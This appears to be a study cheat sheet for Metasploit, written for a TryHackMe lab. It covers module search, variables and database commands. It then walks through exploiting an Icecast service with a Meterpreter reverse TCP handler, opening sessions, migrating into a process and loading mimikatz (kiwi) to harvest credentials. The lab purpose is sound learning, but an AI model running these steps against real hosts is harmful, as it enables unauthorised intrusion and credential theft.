First use metasploit
```bash
msfdb init
```

help
```bash
msfconsole -h

msf5 > help
```

checking DB
```bash
msf5 > db_status
```

make quick connection to host
```bash
msf5 > connect [options] <host> <port>
```
## Module
Search module
```bash
msf5 > search <module>
```

Use module
```bash
msf5 > use <module>
```

Load module
```bash
msf5 > load <module>
```

Check module info
```bash
msf5 > info <module>
```

use module with search
```bash
msf5 > search multi/handler
Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   6  exploit/multi/handler                                                 manual     No     Generic Payload Handler

msf5 > use 6
```

![](https://imgur.com/vKe4ZDj.png)

Major modules:
* Exploit : most common
* Payload : shellcode
* Encoder : in payload obfuscation, avoid signature detection
* NOP : buffer overflow
* Auxiliary : scanning & verification
* Post : looting & pivoting
## Variable

Change value of variable
```bash
msf5 > set <value>
```

Change value of variable globally
```bash
msf5 > setg <value>
```

get value of variable 
```bash
msf5 > get <value>
```

change value to null/no value
```bash
msf5 > unset <value>
```

save console output to a file
```bash
msf5 > spool
```

store setting 
```baSh
mfs5 > save
```

## Example1

run nmap & feed result to db
(-sV : detect the version of services running)
```bash
msf5 > db_nmap -sV <ip>
```

check hosts information in db
```bash
msf5 > hosts
```

check hosts 's services in db
```bash
msf5 > services
```

check hosts 's vulnerablilities
```bash
msf5 > vulns
```

connecting to it with metasploit payload
```bash
msf5 > use icecast
```

search & use  multi/handler
```bash
msf5 > search multi/handler
msf5 > use NUMBER_NEXT_TO_exploit/multi/handler
```

set variables
```bash
msf5 > set PAYLOAD windows/meterpreter/reverse_tcp
msf5 > set LHOST <YOUR_IP_ON_TRYHACKME>
```

return previous exploit
```bash
msf5 > use icecast
```

set attack target
```bash
msf5 > set RHOSTS 10.10.8.33
```

run exploit
`expoit` or `run -j`

check running jobs
```bash
msf5 > jobs
```

check sessions & attack
```bash
msf5 > sessions
msf5 > sessions -i 2
```

transfer ourself to process
```bash
msf5 > migrate <PID>
```

get user info & system info & user privileges
```bash
msf5 > getuid
msf5 > sysinfo
msf5 > getprivs
```

load mimikatz
```bash
msf5 > load kiwi
```


KEYWORDS:
1. icecast
2. multi/handler
